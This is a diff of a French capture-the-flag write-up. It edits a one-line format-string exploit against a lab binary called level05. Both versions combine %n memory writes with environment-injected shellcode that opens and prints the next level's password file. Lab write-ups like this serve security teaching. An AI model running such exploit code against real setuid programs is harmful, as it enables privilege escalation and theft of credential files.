@@ -38,5 +38,5 @@ Breakpoint 1, 0x08048449 in main ()
 </pre>
 - Apres avoir assemblé tout cela donne cette commande
 ```
-(python -c "import struct; print('AAAA' + struct.pack('<I', 0x080497e0) + struct.pack('<I', 0x080497e2) + '%57205d' + '%11\$n' + '%8318d' + '%12\$n')") | env -i SHELLCODE="$(python -c "print('\x90' * 20 + 'jsh.pashl06/hlevehers/he/ush/hom\x89\xe31\xc91\xd2j\x05X\xcd\x80j\x01[\x89\xc11\xd2h\xff\xff\xff\x7f^1\xc0\xb0\xbb\xcd\x80')")" SHELL=/bin/bash ./level05
-```
+(python -c "import struct; print('AAAA' + struct.pack('<I', 0x080497e0) + struct.pack('<I', 0x080497e0 + 2) + '%{}d'.format(0xdf81 - 0xc) + '%11\$n' + '%{}d'.format(0xffff - 0xdf81) + '%12\$n')") \
+| env -i SHELLCODE="$(python -c "print('\x90' * 20 + 'jsh.pashl06/hlevehers/he/ush/hom\x89\xe31\xc91\xd2j\x05X\xcd\x80j\x01[\x89\xc11\xd2h\xff\xff\xff\x7f^1\xc0\xb0\xbb\xcd\x80')")" SHELL=/bin/bash ./level05```
